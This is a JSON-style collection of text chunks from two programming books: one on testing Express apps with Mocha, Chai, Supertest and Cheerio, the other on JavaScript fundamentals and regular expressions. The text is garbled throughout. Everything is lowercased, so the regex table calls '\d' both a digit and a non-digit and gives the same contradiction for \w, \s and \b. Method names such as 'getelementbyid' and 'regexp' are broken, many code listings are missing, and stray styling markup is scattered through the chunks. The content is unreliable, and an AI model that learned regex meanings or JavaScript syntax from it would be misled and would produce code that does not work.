"express-9.2.2.txt__2": "chai is an assertion library. while mocha lays out the tests, chai (almost literally) says \"i expect the helloworld function to return 'hello world'\". the actual syntax is expect(helloworld()).to.equal(\"hello world\"), which reads a lot like the previous english. if helloworld works and returns \u201chello world\u201d, your tests will pass. if it doesn't return \u201chello world\u201d, an error will appear, telling you that things aren't as you expect.", "express-9.2.2.txt__3": "there are a number of assertion libraries (including one built into node), but at the end of the day, mocha waits for an assertion library to throw an error. if no error is thrown, the test passes. if an error is thrown, the test fails. that's why we use chai\u2014it's a nice way to throw errors when our tests fail.", "express-9.2.2.txt__4": "the distinction between mocha and chai is important. mocha is the test runner, so there's an actual executable that runs (you don't ever type node my_tests.js nor do you ever require it). mocha injects some global variables into your code\u2014as we'll see, these globals exist to structure each of your tests. inside of each of these tests, you use chai to actually test your code. when we test our capitalization library, we'll use mocha to break up our tests into pieces like \u201cthe capitalization library capitalizes single words\u201d and \u201cthe capitalization library doesn't break if you pass it the empty string\u201d. at the chai level, we'll actually call our capitalization library and make sure that our module's output matches what we expect.", "express-9.2.4.txt__1": "now that we've written a first version of our capitalization function, let's write a test to see if it works!  create a folder called test in the root of your project. inside that directory, create a file for testing our capitalization; i simply called mine capitalize.js. put the following inside:  listing 9.3 our first test for capitalize (in test/capitalize.js)  #a first, require our function that we're going to test.  #b require chai and then use the \u201cexpect\u201d property, which we'll use to make assertions in our tests.  #c this is called a \u201csuite\u201d, and describes a series of specifications in the same topic. this is at the mocha level.  #d this is a specification, and it has a title and some code to run. this is at the mocha level.  #e do the actual assertions; make sure our code actually does what we expect! this is at the chai level.  so what's going on here?  first, we're requiring our module so that we can test it. next, we're requiring chai and using its expect property so that we can use it to make assertions later on. (chai has two other assertion styles, but we'll stick to this one for now.)  next, we describe a \u201csuite\u201d of tests. this is basically a component of your application; this could be a class or just a slew of functions. this suite is called \"capitalize\"; it's english, not code. in this case, this suite describes the capitalization function.", "express-9.2.5.txt__1": "we've written a single test so far, and it's showed us that our code isn't totally broken. but we don't know if it works on more complex inputs. what would happen if you passed it a string with no letters? what about an empty string? we can see that we're capitalizing the first letter, but are we lowercasing the rest of the string? let's add some more tests to test the \u201cunhappy paths\u201d.", "express-9.2.5.txt__2": "let's start by adding another relatively simple test: does it make the rest of the string lowercase? we'll leave everything from before and we'll add a new test to test/capitalize.js:  listing 9.4 another test for capitalize (in test/capitalize.js)  #a our new tests will make sure it \u201cmakes the rest of the string lowercase\u201d.  #b we expect the capitalization of \u201cjavascript\u201d to equal \u201cjavascript\u201d.  you can run your tests with npm test (or just npm t for short), and you should see something like this:  cool! now we're more confident that we're capitalizing the first letter and lowercasing the rest of the string. but we're not out of the woods yet.  what about adding a test for the empty string? capitalizing the empty string should just return the empty string, right? let's write a test to see if that happens.  listing 9.5 testing capitalization of the empty string (in test/capitalize.js)  run npm test again to run this new test (and all the others). you should see something like the following output:  uh oh! looks like we have a red/failing test. let's look at it to see what's wrong.  first, we can see that the error occurs when we run the \u201cleaves empty strings alone\u201d test. the error is a typeerror, and it's telling us that we can't call touppercase on undefined. we can also see a stack trace, which starts on line 2 of capitalize.js. here's the line that's causing the error:  looks like str[0] is undefined when we pass the empty string, so we'll need to make sure it's defined. let's replace the use of square brackets with the charat method. our new-and-improved function should look like this:  listing 9.6 the new capitalize.js  #a check out this new-and-improved line!  re-run our tests with npm test and you should see everything green!", "express-9.2.5.txt__3": "listing 9.7 some new tests for capitalization (in test/capitalize.js)  run npm test and you should see our tests pass.", "express-9.2.5.txt__4": "unfortunately, there are inexperienced programmers out there (and others are, sadly, fools). some of them might be using your code. you could argue that bugs are their fault, but you could also argue that your code shouldn't be the problem. that's why we should test our function with the string object, just in case. let's write one last test that uses the string object.", "express-9.2.6.txt__1": "so far, we've only seen how we can use mocha and chai to test equality. effectively, we've used a glorified equality operator. but these two modules can do much more than that. we won't go through all of the options here, but we'll look at a couple of examples.  running code before each test  it's common to run setup code before you actually run your assertions. perhaps you're defining a variable to be manipulated or spooling up your server.  if you're doing this setup  across many tests, mocha has the beforeeach function to help reduce the amount of repeated code.  for example, let's say we've made a person model and we want to test it. in every single test, we're creating a person object and we want to test it. here's how we might do that:  listing 9.9 using mocha's beforeeach feature  #a this code is run before every single test, so that the user is defined inside of every test.  the code above tests some of the functionality of an imaginary user object, but it doesn't have code to redefine an example user object inside of every test (inside of every it block); it defines them in a beforeeach block, which redefines the user before running each test.  testing for errors  if we pass a string to our capitalization function, everything should work normally. but if we pass a non-string, like a number or undefined, we want our function to throw some kind of error. we can use chai to test this.  listing 9.10 using chai to test for errors  this will test that calling capitalize with 123 throws an error. the only tricky bit is that we have to wrap it in a function. this is because we don't want our test code to create an error\u2014we want that error to be caught by chai.  reversing tests", "express-9.2.txt__1": "just like it's possible to write web servers with only node.js, it's possible to write tests with only node.js. we could create a file that checked a bunch of conditions to make sure everything was working as normal, and then we could output the results with console.log. like express, we might find this \u201craw\u201d method to be verbose and we might find ourselves having to write a lot of boilerplate code just to write tests.", "express-9.2.txt__2": "mocha is a testing framework that helps to reduce some of this headache. (it's written by the original creator of express, by the way.) it gives you a nice syntax for organizing your tests, and has a several other features like asynchronous test support and easy-to-read output. it's not specifically tied to express, so you can use it to test express applications, javascript functions, database models, and anything else that runs inside the node runtime.", "express-9.3.1.txt__1": "because it's the simplest, we'll start by testing the plain text api.", "express-9.3.1.txt__2": "create a folder called test for all your tests, and create a file for testing the plain text api; i called mine txt.js. inside, put the following skeleton:  listing 9.13 skeleton of plain text tests (in test/txt.js)  #a we'll require our app, because that's what will be testing. we'll put it inside app.js in the root of our project (but because this is tdd, we haven't actually done this yet).  #b there will be two tests. one makes sure we get a plain text response, and another makes sure we get an ip address.  so far, this is just a skeleton, but it's not too different from what we had before when we were testing our capitalization module. we're requiring our app (which we haven't written yet!), describing a suite of tests (plain text mode, in this case), and then defining two tests.  let's fill in the first test, to make sure that our application returns a plain text response. remember: what we're testing doesn't exist yet. we're going to write the tests, watch them fail, and then \u201cfill in\u201d the real code to make our tests pass.", "express-9.3.1.txt__3": "listing 9.14 using supertest to check the response (in test/txt.js)  #a when running asynchronous tests like these, our function is passed a callback. we call that callback when we're all done running our code.  #b supertest builds up the request. we're testing our app, visiting the \u201c/\u201d url, and setting an http header.  #c supertest then checks the response, making sure the content-type matches \u201ctext/plain\u201d and that we get a status code of 200.  notice how we use supertest to test our application. it's not quite like chai in that it reads like english, but it should be pretty straightforward. here's what we're doing with supertest, line by line:  1. we wrap our app up by calling supertest with app as an argument. this returns a supertest object.  2. next, we call get on that supertest object with the route we want to request; in this case, we want the application's root (at \u201c/\u201d).  3. next, we set an option on this request; in this case, we're setting the http accept header to text/plain. we can call set multiple times if we want to set multiple headers, but we don't need to for this test.", "express-9.3.1.txt__4": "5. in the second call to expect, we're making sure we get the http status code of 200, meaning \u201cok\u201d.  you could imagine writing a test for a nonexistent resource, where you'd expect the status code to be 404, or any of the other many http status codes.  6. finally, we call end with done. done is a callback function passed to us by mocha which we use to signal that asynchronous tests (like this one) are all done.", "express-9.3.1.txt__5": "listing 9.15 testing that our app returns an ip address (in test/txt.js)  #a this request setup is the same as before.  #b we call expect with a function that throws an error if we don't get a valid ip.  #c once again, we call \u201cdone\u201d when we're done.  the first three lines of this test and the last line should look similar to before; we set up supertest to test our app, and when we're done testing things, we call done.  the middle part calls expect with a function this time. this function throws an error if res.text (the text that our application returns) isn't an ip according to the is-ip module. if it is a valid ip address, then the function simply finishes with no fuss.  one last thing: we've got some duplicate code here. in this test, we're always making the same request to our server; the same application, the same route, and the same headers. what if we didn't have to repeat ourselves? enter mocha's beforeeach feature:  listing 9.16 reducing repetition in our code with beforeeach (in test/txt.js)  #a we can use beforeeach to run the same code before every test in this describe block. in this case, we're reassigning the request variable to a new supertest object.  #b we can use the variable in tests without repeating ourselves.  as you can see, we're using beforeeach to remove repeated code. the benefits of this really start to show as you have many tests with the same setup every time.", "express-9.3.2.txt__1": "now that it's time to write some \u201creal\u201d code, create app.js in the root of your project and fill in the following:  listing 9.17 first draft of app.js  #a we write some code to return the ip address.  #b export the app for testing.", "express-9.3.2.txt__2": "if you run npm test now, you'll see something like the following output:  this is good! we're not all the way done because only half of our tests pass, but it looks like we're returning an ip address. add just one more line to make all of our tests pass:  listing 9.18 making app.js return plain text  #a the new line: make sure the content-type is some variant of plain text.  now, when you run npm test, you'll see all of your tests pass!", "express-9.3.3.txt__1": "as we've seen, if the user requests plain text, then they'll get plain text. but if they want html, they should get html, but they're just getting plain text right now. to fix this \u201cthe tdd way\u201d, we'll write some tests to make sure the html stuff works, we'll watch those tests fail, and then we'll fill in the rest of the code.", "express-9.3.3.txt__2": "create test/html.js which will hold the tests for the html part of our server. the skeleton for this file will look pretty similar to what we've seen in the plain text part of our tests, but the \u201cinnards\u201d of one of them will look pretty different. here's the skeleton of the html tests:  listing 9.19 testing our html responses (in test/html.js)  #a this beforeeach is very similar to before, but we're requesting text/html instead of text/plain.  so far, this should look a lot like the code we had from our plain text tests. we're requiring the app, supertest, and is-ip; we're doing some test setup in a beforeeach block; we're making sure we're getting html back and also an ip address.  the first test also looks pretty darn similar. let's fill it in now:  listing 9.20 testing for an html response (in test/html.js)  this is very similar to before. we're testing for a response that contains \u201chtml\u201d and we want the http status code to be 200.  the next test is where things get pretty different.  first, let's write the code to get the html response from the server. this should look pretty similar to what we've seen before:  listing 9.21 getting the html response (in test/html.js)  but now it's time to do something with that html. we don't just want the ip address to show up somewhere in the html. we want it to show up inside a specific html tag. our response will look something like this:  listing 9.22 what we might be looking for in our html responses  we don't care too much about most of this html; the thing we care to test is inside something with the class ip-address. how do we get it out?", "express-9.3.3.txt__3": "start by requiring cheerio at the top of your test file, and then we'll use cheerio to parse the html we get from our server.  listing 9.23 parsing html with cheerio (in test/html.js)  #a initialize a cheerio object from our html.  #b get the ip address from the html. this should look a lot like jquery.  #c test for an ip address just like before.  here, we use cheerio to parse our html and make sense of it like we do with jquery. once we've parsed the html and gotten the value we want, we run our tests just like before! cheerio makes parsing html easy, and you can use it to test html responses.  now that we've written our two tests, we can run npm test. we should see our plain text tests pass as before, but our new html tests will fail because we haven't written the code yet\u2014this is the \u201cred\u201d step. let's make those tests pass.  if you've been following along so far, the code for this shouldn't be too crazy. we'll make some changes to our request handler, and render an ejs view which will contain the ip address as our test expects.  first, let's make some modifications to app.js. we'll set up ejs as our view engine and then render the html view when the client wants html.  listing 9.24 filling in app.js to support html responses  #a set up our views with ejs and make sure we're using the \u201cviews\u201d directory.  #b if the request accepts html, render the \u201cindex\u201d template (which we'll define in a moment).  #c otherwise, send the ip address as plain text as we've done before.  this code shouldn't be too wild if you've seen views before. we're setting up ejs as our view engine, assigning a path to it, and then rendering a view if the user requests it.  the last thing we'll need to do is define the ejs view. create views/index.ejs and put the following code inside:  listing 9.25 views/index.ejs  it's time for the big moment. run all of your tests with npm test, and you should see a sea of positivity:  all of your tests pass! it's all green! happy days! now you know how to test an application with mocha, chai, supertest, and cheerio.", "express-9.3.txt__1": "the techniques above are useful for testing \u201cbusiness logic\u201d like model behavior or utility functions. but you might also want to test the routes or middleware of your express applications. you might want to make sure that your api endpoints are returning the values they should, or that you're serving static files, or a number of other things.", "express-9.3.txt__2": "we'll use supertest to accomplish this. supertest spools up our express server and sends requests to it. once the requests come back, we can make assertions about the response. for example, we might want to make sure that we get an http 200 status code when we send a get request to the homepage. supertest will send that get request to the homepage and then, when we get the response, make sure it had 200 as its http status code. we can use this to test and middleware or route that we define in our application.", "express-9.3.txt__3": "let's build \u201cyour ip is...\u201d, a simple application for getting users' ip addresses. it will support a \u201cclassic\u201d html view when you visit it in a browser. you'll also be able to get the user's ip address as plain text. there will be two separate routes for these two responses. if a visitor comes to the root of your site (at /), they'll be shown their ip address as an html page. if they visit /plain, they'll be given their ip address as plain text.", "express-9.3.txt__4": "create a new directory for this project, and create a package file in the folder:  listing 9.12 package.json for \u201cyour ip is...\u201d  #a we'll use ejs to render the html page, as we've used before.  #b cheerio lets us parse the rendered html for testing. we'll use this to make sure the ip address is properly inserted into our html.  #c is-ip exposes a function that lets us determine whether a string is an ip address. we'll use this to make sure the ip addresses are, indeed, ip addresses.  #d supertest lets us spool up express servers and test them. we'll use supertest to test both of our application's routes.", "express-9.txt__1": "writing reliable code can be difficult. even small software can have be too complex for one person, which can create bugs. developers have come up with a number of tricks to try to squash these errors. compilers and syntax checkers automatically scan your code for potential bugs; peer code reviews let other people look at what's written to see if they can spot errors; style guides can keep teams of developers on the same page. these are all helpful tricks we play that keep our code more reliable and bug-free.", "express-9.txt__2": "another powerful way to tackle bugs is with automated testing. automated testing lets us codify (literally!) how we want our software to behave, and lets us say \u201cmy code works!\u201d with much more confidence. it lets us refactor code without worrying if we broke something, and gives us easy feedback about where our code fails.", "javascript-1.1.1.txt__1": "1.1.1. how will javascript evolve?", "javascript-1.1.1.txt__2": "in this book we thoroughly explore es6 but also focus on es7 features, such as the new async function, which will help you deal with asynchronous code (discussed in chapter 6).  note  when we cover features of javascript defined in es6/es2015 or es7/es2016, you'll see these icons alongside a link to information about whether they're supported by your browser.", "javascript-1.1.2.txt__1": "1.1.2. transpilers give us access to tomorrow's javascript today", "javascript-1.1.txt__1": "1.1. understanding the javascript language", "javascript-1.1.txt__2": "people often feel that if they know c# or java, they already have a pretty solid understanding of how javascript works. but it's a trap! when compared to other mainstream languages, javascript is much more functionally oriented. some javascript concepts differ fundamentally from those of most other languages.", "javascript-1.1.txt__3": "these differences include the following:", "javascript-1.1.txt__4": "function closures\u2014 the concept of function closures is generally poorly understood, but at the same time it fundamentally and irrevocably exemplifies the importance of functions to javascript. for now, it's enough to know that a function is a closure when it actively maintains (\u201ccloses over\u201d) the external variables used in its body. don't worry for now if you don't see the many benefits of closures; we'll make sure all is crystal clear in chapter 5. in addition to closures, we'll thoroughly explore the many aspects of functions themselves in chapters 3 and 4, as well as identifier scopes in chapter 5.", "javascript-1.1.txt__5": "scopes\u2014 until recently, javascript didn't have block-level variables (as in other c-like languages); instead, we had to rely only on global variables and function-level variables.", "javascript-1.1.txt__6": "javascript consists of a close relationship between objects and prototypes, and functions and closures. understanding the strong relationships between these concepts can vastly improve your javascript programming ability, giving you a strong foundation for any type of application development, regardless of whether your javascript code will be executed in a web page, in a desktop app, in a mobile app, or on the server.", "javascript-1.1.txt__7": "in addition to these fundamental concepts, other javascript features can help you write more elegant and more efficient code. some of these are features that seasoned developers like bob will recognize from other languages, such as java and c++. in particular, we focus on the following:  generators, which are functions that can generate multiple values on a per-request basis and can suspend their execution between requests  promises, which give us better control over asynchronous code  proxies, which allow us to control access to certain objects  advanced array methods, which make array-handling code much more elegant  maps, which we can use to create dictionary collections; and sets, which allow us to deal with collections of unique items  regular expressions, which let us simplify what would otherwise be complicated pieces of code  modules, which we can use to break code into smaller, relatively self-contained pieces that make projects more manageable", "javascript-1.2.txt__1": "1.2. understanding the browser", "javascript-1.2.txt__2": "figure 1.1. client-side web applications rely on the infrastructure provided by the browser. we'll particularly focus on the dom, events, timers, and browser apis.  we'll concentrate on the following:", "javascript-1.2.txt__3": "events\u2014 a huge majority of javascript applications are event-driven applications, meaning that most of the code is executed in the context of a response to a particular event. examples of events include network events, timers, and user-generated events such as clicks, mouse moves, keyboard presses, and so on. for this reason, we'll thoroughly explore the mechanisms behind events in chapter 13. we'll pay special attention to timers, which are frequently a mystery but let us tackle complex coding tasks such as long-running computations and smooth animations.", "javascript-1.2.txt__4": "browser api\u2014 to help us interact with the world, the browser offers an api that allows us to access information about devices, store data locally, or communicate with remote servers. we'll explore some of these apis throughout the book.", "javascript-1.2.txt__5": "the quality of browsers has improved greatly as of late, but they all still have some bugs, missing apis, and browser-specific quirks that we need to deal with. developing a comprehensive strategy for tackling these browser issues, and becoming intimately familiar with their differences and quirks, can be almost as important as proficiency in javascript itself.", "javascript-1.2.txt__6": "when we're writing browser applications or javascript libraries to be used in them, choosing which browsers to support is an important consideration. we'd like to support them all, but limitations on development and testing resources dictate otherwise. for this reason, we'll thoroughly explore strategies for cross-browser development in chapter 14.", "javascript-1.3.1.txt__1": "1.3.1. debugging", "javascript-1.3.1.txt__2": "firebug\u2014 the popular developer extension for firefox that got the ball rolling (http://getfirebug.com/)  chrome devtools\u2014 developed by the chrome team and used in chrome and opera  firefox developer tools\u2014 a tool included in firefox, built by the firefox team  f12 developer tools\u2014 included in internet explorer and microsoft edge  webkit inspector\u2014 used by safari  as you can see, every major browser offers developer tools that we can use to debug our web applications. the days of using javascript alerts for debugging are long gone!", "javascript-1.3.2.txt__1": "1.3.2. testing", "javascript-1.3.3.txt__1": "1.3.3. performance analysis  another important practice is performance analysis. the javascript engines have made astounding strides in the performance of javascript, but that's no excuse for writing sloppy and inefficient code.  we'll use code such as the following later in this book to collect performance information:  console.time(\"my operation\");  #a  for(var n = 0; n < maxcount; n++){  #b  /*perform the operation to be measured*/  #b  #b  console.timeend(\"my operation\");  #c  #a - starts the timer  #b - performs the operation multiple times  #c - stops the timer  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":19},{\\\"line\\\":2,\\\"ch\\\":27}],[{\\\"line\\\":8,\\\"ch\\\":0},{\\\"line\\\":8,\\\"ch\\\":21}]]\"}  !@%style%@!  here, we bracket the execution of the code to be measured with two calls to the time and timeend methods of the built-in console object.", "javascript-1.3.3.txt__2": "when the operation ends, we call the console.timeend method with the same name. this causes the browser to output the time that elapsed since the timer was started.", "javascript-1.3.txt__1": "1.3. using current best practices", "javascript-1.4.txt__1": "1.4. boosting skill transferability", "javascript-1.4.txt__2": "achieving a deep understanding of fundamental javascript principles with the knowledge of core apis can therefore make you a more versatile developer. by using the browsers and node.js (an environment derived from the browser), you can develop almost any type of application imaginable:", "javascript-1.4.txt__3": "mobile apps with frameworks, such as apache cordova (https://cordova.apache.org/). similar to desktop apps built with web technologies, frameworks for mobile apps use a wrapped browser but with additional platform-specific apis that let us interact with the mobile platform.  server-side applications and applications for embedded devices with node.js, an environment derived from the browser that uses many of the same underlying principles as the browser. for example, node.js executes javascript code and relies on events.", "javascript-1.5.txt__1": "1.5. summary", "javascript-1.txt__1": "1. javascript is everywhere  this chapter covers  the core language features of javascript  the core items of a javascript engine  three best practices in javascript development", "javascript-1.txt__2": "he learned some php so that he could dynamically generate web pages, which he usually sprinkled with javascript in order to achieve complex functionality such as form validation and even dynamic on-page clocks! fast-forward a couple of years, and smartphones had become a thing, so anticipating a large new market opening up, bob went ahead and learned objective-c and java to develop mobile apps that run on ios and android.", "javascript-1.txt__3": "over the years, bob has created many successful applications that all have to be maintained and extended. unfortunately, jumping daily between all these different programming languages and application frameworks has really started to wear down poor bob.", "javascript-1.txt__4": "that's extraordinary! what took bob 10 years and 5 languages to do, ann has achieved in 2 years and in just one language. throughout the history of computing, it has been rare for a particular knowledge set to be so easily transferable and useful across so many different domains.", "javascript-10.1.txt__1": "10.1. why regular expressions rock", "javascript-10.1.txt__2": "99999-9999", "javascript-10.1.txt__3": "let's create a function that, given a string, verifies that the u.s. postal service will stay happy. we could resort to performing a comparison on each character, but we're a ninja and that's too inelegant a solution, resulting in a lot of needless repetition. rather, consider the following solution.", "javascript-10.1.txt__4": "listing 10.1. testing for a specific pattern in a string  function isthisazipcode(candidate) {  if (typeof candidate !== \"string\" ||  #a  candidate.length != 10) return false;  #a  for (let n = 0; n < candidate.length; n++) {  let c = candidate[n];  switch (n) {  #b  case 0: case 1: case 2: case 3: case 4:  case 6: case 7: case 8: case 9:  if (c < '0' || c > '9') return false;  break;  case 5:  if (c != '-') return false;  break;  return true;  #c  #a - short-circuits obviously bogus candidates  #b - performs tests based on character index  #c - if all succeeds, we're good!  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  this code takes advantage of the fact that we have only two checks to make, depending on the position of the character within the string. we still need to perform up to nine comparisons at runtime, but we have to write each comparison only once.  even so, would anyone consider this solution elegant? it's more elegant than the brute-force, noniterative approach, but it still seems like an awful lot of code for such a simple check. now consider this approach:  function isthisazipcode(candidate) {  return /^\\d{5}-\\d{4}$/.test(candidate);", "javascript-10.2.txt__1": "10.2. a regular expression refresher  much as we'd like to, we can't offer you an exhaustive tutorial on regular expressions in the space we have. after all, entire books have been dedicated to regular expressions. but we'll do our best to hit all the important points.  for more detail than we can offer in this chapter, the books mastering regular expressions by jeffrey e. f. friedl, introducing regular expressions by michael fitzgerald, and regular expressions cookbook by jan goyvaerts and steven levithan, all from o'reilly, are popular choices.  let's dig in.  10.2.1. regular expressions explained", "javascript-10.2.txt__2": "in javascript, as with most other object types, we have two ways to create a regular expression:  via a regular expression literal  by constructing an instance of a regexp object  for example, if we want to create a mundane regular expression (or regex, for short) that matches the string test exactly, we could do so with a regex literal:  const pattern = /test/;  that might look strange, but regex literals are delimited with forward slashes in the same way that string literals are delimited with quote characters.  alternatively, we could construct a regexp instance, passing the regex as a string:  const pattern = new regexp(\"test\");  both formats result in the same regex being created in the variable pattern.  tip  the literal syntax is preferred when the regex is known at development time, and the constructor approach is used when the regex is constructed at runtime by building it up dynamically in a string.", "javascript-10.2.txt__3": "in addition to the expression itself, five flags can be associated with a regex:  i\u2014makes the regex case-insensitive, so /test/i matches not only test, but also test, test, test, and so on.  g\u2014matches all instances of the pattern, as opposed to the default of local, which matches only the first occurrence. more on this later.  m\u2014allows matches across multiple lines, as might be obtained from the value of a textarea element.  y\u2014enables sticky matching. a regular expression performs sticky matching in the target string by attempting to match from the last match position.  u\u2014enables the use of unicode point escapes (\\u{...}).  these flags are appended to the end of the literal (for example, /test/ig) or passed in a string as the second parameter to the regexp constructor (new regexp(\"test\", \"ig\")).  matching the exact string test (even in a case-insensitive manner) isn't interesting\u2014after all, we can do that particular check with a simple string comparison. so let's take a look at the terms and operators that give regular expressions their immense power to match more compelling patterns.  10.2.2. terms and operators  regular expressions, like most other expressions we're familiar with, are made up of terms and operators that qualify those terms. in the sections that follow, you'll see how these terms and operators can be used to express patterns.  exact matching  any character that's not a special character or operator (which we'll introduce as we go along) must appear literally in the expression. for example, in our /test/ regex, four terms represent characters that must appear literally in a string for it to match the expressed pattern.  placing such characters one after the other implicitly denotes an operation that means followed by. so /test/ means t followed by e followed by s followed by t.  matching from a class of characters  many times, we won't want to match a specific literal character, but a character from a finite set of characters. we can specify this with the set operator (also called the character class operator) by placing the set of characters that we want to match in square brackets: [abc].  the preceding example signifies that we want to match any of the characters a, b, or c. note that even though this expression spans five characters (three letters and two brackets), it matches only a single character in the candidate string.  other times, we want to match anything but a finite set of characters. we can specify this by placing a caret character (^) right after the opening bracket of the set operator:  [^abc]  this changes the meaning to any character but a, b, or c.  there's one more invaluable variation to the set operation: the ability to specify a range of values. for example, if we want to match any one of the lowercase characters between a and m, we could write [abcdefghijklm]. but we can express that much more succinctly as follows:  [a-m]  the dash indicates that all characters from a through m inclusive (and lexicographically) are included in the set.  escaping", "javascript-10.2.txt__4": "how do we specify that we want to match a literal [ or $ or ^ or other special character? within a regex, the backslash character escapes whatever character follows it, making it a literal match term. so \\[ specifies a literal match to the [ character, rather than the opening of a character class expression. a double backslash (\\\\) matches a single backslash.", "javascript-10.2.txt__5": "begins and ends", "javascript-10.2.txt__6": "similarly, the dollar sign ($) signifies that the pattern must appear at the end of the string:  /test$/  using both ^ and $ indicates that the specified pattern must encompass the entire candidate string:  /^test$/  repeated occurrences  if we want to match a series of four a characters, we might express that with /aaaa/, but what if we want to match any number of the same character? regular expressions enable us to specify several repetition options:  to specify that a character is optional (it can appear either once or not at all), follow it with ?. for example, /t?est/ matches both test and est.  to specify that a character should appear one or many times, use +, as in /t+est/, which matches test, ttest, and tttest, but not est.  to specify that the character appears zero, one, or many times, use *, as in /t*est/, which matches test, ttest, tttest, and est.  to specify a fixed number of repetitions, indicate the number of allowed repetitions between braces. for example, /a{4}/ indicates a match on four consecutive a characters.  to specify a range for the repetition count, indicate the range with a comma separator. for example, /a{4,10}/ matches any string of 4 through 10 consecutive a characters.  to specify an open-ended range, omit the second value in the range (but leave the comma). the regex /a{4,}/ matches any string of four or more consecutive a characters.", "javascript-10.2.txt__7": "for example, if we're matching against the string aaa, the regular expression /a+/ would match all three a characters, whereas the nongreedy expression /a+?/ would match only one a character, because a single a character is all that's needed to satisfy the a+ term.  predefined character classes", "javascript-10.2.txt__8": "table 10.1 lists these terms and the character or set they represent. these predefined sets help keep our regular expressions from looking excessively cryptic.  table 10.1. predefined character classes and character terms  predefined term  matches  \\t  horizontal tab  \\b  backspace  \\v  vertical tab  \\f  form feed  \\r  carriage return  \\n  newline  \\ca : \\cz  control characters  \\u0000 : \\uffff  unicode hexadecimal  \\x00 : \\xff  ascii hexadecimal  any character, except for whitespace characters (\\s)  \\d  any decimal digit; equivalent to [0-9]  \\d  any character but a decimal digit; equivalent to [^0-9]  \\w  any alphanumeric character including underscore; equivalent to [a-za-z0-9_]  \\w  any character but alphanumeric and underscore characters; equivalent to [^a-za-z0-9_]  \\s  any whitespace character (space, tab, form feed, and so on)  \\s  any character but a whitespace character  \\b  a word boundary  \\b  not a word boundary (inside a word)  grouping  so far, you've seen that operators (such as + and *) affect only the preceding term. if we want to apply the operator to a group of terms, we can use parentheses for groups, just as in a mathematical expression. for example, /(ab)+/ matches one or more consecutive occurrences of the substring ab.  when a part of a regex is grouped with parentheses, it serves double duty, also creating what's known as a capture. there's a lot to captures, and we discuss them in more depth in section 10.4.  alternation (or)  alternatives can be expressed using the pipe (|) character. for example: /a|b/ matches either the a or b character, and /(ab)+|(cd)+/ matches one or more occurrences of either ab or cd.  backreferences", "javascript-10.2.txt__9": "an example is /^([dtn])a\\1/, which matches a string that starts with any of the d, t, or n characters, followed by an a, followed by whatever character matches the first capture. this latter point is important! this isn't the same as /[dtn] a[dtn]/. the character following the a can't be any of d, or t, or n, but must be whichever one of those triggers the match for the first character. as such, which character the \\1 will match can't be known until evaluation time.", "javascript-10.3.txt__1": "10.3. compiling regular expressions  regular expressions go through multiple phases of processing, and understanding what happens during each phase can help us optimize javascript code that uses regular expressions. the two main phases are compilation and execution.  compilation occurs when the regular expression is first created. execution occurs when we use the compiled regular expression to match patterns in a string.  during compilation, the expression is parsed by the javascript engine and converted into its internal representation (whatever that may be). this phase of parsing and conversion must occur every time a regular expression is created (discounting any internal optimizations performed by the browser).", "javascript-10.3.txt__2": "as we learned in our regular expression overview in the previous section, there are two ways of creating a compiled regular expression in javascript: via a literal and via a constructor. let's look at an example in the following listing.  listing 10.2. two ways to create a compiled regular expression  const re1 = /test/i;  #a  const re2 = new regexp(\"test\", \"i\");  #b  assert(re1.tostring()=== \"/test/i\",  \"verify the contents of the expression.\");  assert(re1.test(\"test\"), \"yes, it's case-insensitive.\");  assert(re2.test(\"test\"), \"this one is too.\");  assert(re1.tostring()=== re2.tostring(),  \"the regular expressions are equal.\");  assert(re1 !== re2, \"but they are different objects.\");  #a - creates a regex via a literal  #b - creates a regex via the constructor  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-10.3.txt__3": "note that each regex has a unique object representation: every time a regular expression is created (and thus compiled), a new regular expression object is created. this is unlike other primitive types (such as string, number, and so on), because the result will always be unique.", "javascript-10.3.txt__4": "for example, let's say that we want to determine which elements within a document have a particular class name, whose value we won't know until runtime. because elements are capable of having multiple class names associated with them (inconveniently stored in a space-delimited string), this serves as an interesting example of runtime, regular-expression compilation (see the following listing).", "javascript-10.3.txt__5": "listing 10.3. compiling a runtime regular expression for later use  <div class=\"samurai ninja\"></div>  #a  <div class=\"ninja samurai\"></div>  #a  <div></div>  #a  <span class=\"samurai ninja ronin\"></span>  #a  <script>  function findclassinelements(classname, type) {  const elems =  #b  document.getelementsbytagname(type || \"*\");  const regex =  #c  new regexp(\"(^|\\\\s)\" + classname + \"(\\\\s|$)\");  const results = [];  #d  for (let i = 0, length = elems.length; i < length; i++)  if (regex.test(elems[i].classname)) {  #e  results.push(elems[i]);  return results;  assert(findclassinelements(\"ninja\", \"div\").length === 2,  \"the right amount of div ninjas was found.\");  assert(findclassinelements(\"ninja\", \"span\").length === 1,  \"the right amount of span ninjas was found.\");  assert(findclassinelements(\"ninja\").length === 3,  \"the right amount of ninjas was found.\");  </script>  #a - creates test subjects of various elements with various class names  #b - collects elements by type  #c - compiles a regex using the passed class name  #d - stores the results  #e - tests for regex matches  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-10.3.txt__6": "then we collect all the elements of the specified type by using the getelementsbytagname built-in method and set up our regular expression:  const regex = new regexp(\"(^|\\\\s)\" + classname + \"(\\\\s|$)\");  note the use of the new regexp() constructor to compile a regular expression based on the class name passed to the function. this is an instance where we can't use a regex literal, as the class name for which we'll search isn't known in advance.  we construct (and hence, compile) this expression once in order to avoid frequent and unnecessary recompilation. because the contents of the expression are dynamic (based on the incoming classname argument), we can realize major performance savings by handling the expression in this manner.", "javascript-10.4.txt__1": "10.4. capturing matching segments", "javascript-10.4.txt__2": "10.4.1. performing simple captures  say we want to extract a value that's embedded in a complex string. a good example of such a string is the value of the css transform property, through which we can modify the visual position of an html element.  listing 10.4. a simple function for capturing an embedded value  <div id=\"square\" style=\"transform:translatey(15px);\"></div>  #a  <script>  function gettranslatey(elem){  const transformvalue = elem.style.transform;  if(transformvalue){  const match = transformvalue.match(/translatey\\(([^\\)]+)\\)/);  #b  return match ? match[1] : \"\";  #b  return \"\";  const square = document.getelementbyid(\"square\");  assert(gettranslatey(square) === \"15px\",  \"we've extracted the translatey value\");  </script>  #a - defines the test subject  #b - extracts the translatey value from the string  